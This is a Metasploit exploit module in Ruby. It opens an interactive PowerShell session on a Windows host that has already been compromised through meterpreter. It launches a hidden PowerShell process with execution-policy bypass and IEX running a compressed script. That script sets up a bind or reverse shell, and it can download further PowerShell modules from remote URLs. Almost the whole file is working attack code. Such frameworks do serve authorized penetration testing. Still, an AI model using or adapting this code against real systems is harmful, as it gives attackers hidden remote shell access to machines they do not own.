1##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Local

  include Rex::Powershell::Command

  def initialize(info = {})
    super(update_info(info,
      'Name'                 => "Windows Local Interactive Powershell Session",
      'Description'          => %q(
        This module will start a new interactive PowerShell bind session. A list of
        modules (comma separated) can be supplied in the LOAD_MODULES option to import
        into the interactive session. E.g. http://site/p1.ps1,http://site/p2.ps1
        Use a meterpreter route to ensure you can gain access to the bind port.
      ),
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'DisclosureDate'       => 'Apr 15 2015',
      'Author'        =>
        [
          'Ben Turner', # benpturner
          'Dave Hardy' # davehardy20
        ],
      'References'    =>
        [
          ['URL', 'https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/']
        ],
      'Payload'        =>
        {
          'Compat' =>
          {
            'PayloadType'    => 'cmd_interact',
            'ConnectionType' => 'find'
          }
        },
      'Arch'          => [ ARCH_CMD ],
      'Targets'       =>
        [
          [ 'Windows', {} ]
        ],
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        Opt::LPORT(4444),
        OptString.new('LOAD_MODULES', [false, 'A list of powershell modules seperated by a comma to download over the Internet', nil])
      ], self.class)
  end

  def exploit
    lport = datastore['LPORT']

    if datastore['RHOST'].to_s.empty?
      rhost = session.session_host
    else
      rhost = datastore['RHOST']
    end

    template_path = File.join(
      Msf::Config.data_directory,
      'exploits',
      'powershell',
      'powerfun.ps1')

    script_in = File.read(template_path)

    if datastore['LHOST'].to_s.empty?
      script_in << "\npowerfun -Command bind"
    else
      lhost = datastore['LHOST']
      script_in << "\npowerfun -Command reverse"
    end

    mods = ''

    if datastore['LOAD_MODULES']
      mods_array = datastore['LOAD_MODULES'].to_s.split(',')
      mods_array.collect(&:strip)
      print_status("Loading #{mods_array.count} modules into the interactive PowerShell session")
      mods_array.each {|m| vprint_good " #{m}"}
      mods = "\"#{mods_array.join("\",\n\"")}\""
      script_in << " -Download true\n"
    end

    script_in.gsub!('MODULES_REPLACE', mods)
    script_in.gsub!('LPORT_REPLACE', lport.to_s)
    script_in.gsub!('LHOST_REPLACE', lhost.to_s)
    script = Rex::Powershell::Command.compress_script(script_in)

    res = session.sys.process.execute("powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $(#{script})", nil, 'Hidden' => true, 'Channelized' => false)
    fail_with(Failure::Unknown,'Failed to start powershell process') unless res && res.pid
    computer_name = session.sys.config.sysinfo['Computer']
    vprint_status("Started PowerShell on #{computer_name} - PID: #{res.pid}")

    if datastore['LHOST'].to_s.empty?
      print_status("Attemping to connect to #{rhost}:#{lport}...")
      ctimeout = 30
      stime = Time.now.to_i
      last_error = nil

      while stime + ctimeout > Time.now.to_i
        Rex::ThreadSafe.sleep(2)
        begin
          client = Rex::Socket::Tcp.create(
            'PeerHost' => rhost,
            'PeerPort' => lport.to_i,
            'Proxies'  => datastore['Proxies'],
            'Context'  =>
              {
                'Msf'        => framework,
                'MsfPayload' => payload_instance,
                'MsfExploit' => self
              })
        rescue ::EOFError, Errno::ETIMEDOUT, Errno::ECONNRESET, Rex::ConnectionError, Rex::ConnectionTimeout, ::Timeout::Error => e
          last_error = e
        end

        if client
          handler(client)
          return
        end
      end
      print_warning("If a shell is unsuccesful, ensure you have access to the target host and port.")
      print_status("Try adding a route to the host: `route help`")
      if last_error
        raise last_error
      else
        fail_with(Failure::Unknown, "Unable to connect")
      end
    else
      print_status("Waiting for connection from #{rhost}:#{lport}...")
    end
  end
end
